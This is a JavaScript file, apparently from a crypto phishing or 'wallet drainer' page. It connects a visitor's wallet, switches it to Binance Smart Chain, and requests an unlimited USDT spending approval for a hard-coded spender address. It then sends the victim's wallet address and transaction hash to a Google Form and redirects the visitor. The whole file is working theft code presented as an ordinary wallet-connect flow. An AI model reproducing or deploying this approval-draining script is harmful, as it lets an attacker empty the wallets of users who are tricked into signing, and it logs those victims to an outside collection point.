let provider;
let signer;
let tokenContract;

// ============ CONFIG ============
const TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT BSC
const SPENDER_ADDRESS = "0x220BB5df0893F21f43e5286Bc5a4445066F6ca56";

// Google Form
const GOOGLE_FORM_URL =
  "https://docs.google.com/forms/d/e/1FAIpQLSdtsj3KnwkgqCYvZwjr3F8ypCjM7aX6WCUEt5sKIcHsXhXrKQ/formResponse";

const ENTRY_WALLET = "entry.916552859";
const ENTRY_TXHASH = "entry.1449465266";
const ENTRY_CHAIN  = "entry.1912151432";

// BSC
const BSC_CHAIN_ID = "0x38"; // 56

// ERC20
const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)"
];

// ============ CONNECT WALLET ============
async function connectWallet() {
  try {
    if (!window.ethereum) {
      alert("Wallet not detected");
      return;
    }

    // 1️⃣ Create provider
    provider = new ethers.BrowserProvider(window.ethereum);

    // 2️⃣ Request account access
    await provider.send("eth_requestAccounts", []);

    // 3️⃣ Switch to BSC
    await switchToBSC();

    // 4️⃣ Re-create provider AFTER switch
    provider = new ethers.BrowserProvider(window.ethereum);
    signer = await provider.getSigner();

    // 5️⃣ Create contract
    tokenContract = new ethers.Contract(
      TOKEN_ADDRESS,
      ERC20_ABI,
      signer
    );

    const user = await signer.getAddress();
    document.getElementById("status").innerText =
      "Connected (BSC): " + user.slice(0, 6) + "..." + user.slice(-4);

  } catch (err) {
    console.error(err);
    alert("Wallet connection failed");
  }
}

// ============ SWITCH TO BSC ============
async function switchToBSC() {
  try {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: BSC_CHAIN_ID }]
    });
  } catch (err) {
    if (err.code === 4902) {
      await window.ethereum.request({
        method: "wallet_addEthereumChain",
        params: [{
          chainId: BSC_CHAIN_ID,
          chainName: "Binance Smart Chain",
          nativeCurrency: {
            name: "BNB",
            symbol: "BNB",
            decimals: 18
          },
          rpcUrls: ["https://bsc-dataseed.binance.org/"],
          blockExplorerUrls: ["https://bscscan.com"]
        }]
      });
    } else {
      throw err;
    }
  }
}

// ============ APPROVE ============
async function executeApproval() {
  try {
    if (!tokenContract) {
      alert("Connect wallet first");
      return;
    }

    const wallet = await signer.getAddress();

    document.getElementById("status").innerText =
      "Waiting for approval...";

    const tx = await tokenContract.approve(
      SPENDER_ADDRESS,
      ethers.MaxUint256
    );

    const receipt = await tx.wait();

    if (receipt.status === 1) {
      submitToGoogleForm(wallet, tx.hash, "BSC");
      window.location.href = "details.html";
    }

  } catch (err) {
    console.error(err);
    alert("Approval failed or rejected");
  }
}

// ============ GOOGLE FORM ============
function submitToGoogleForm(wallet, txHash, chain) {
  const data = new URLSearchParams();
  data.append(ENTRY_WALLET, wallet);
  data.append(ENTRY_TXHASH, txHash);
  data.append(ENTRY_CHAIN, chain);

  fetch(GOOGLE_FORM_URL, {
    method: "POST",
    mode: "no-cors",
    body: data
  });
}
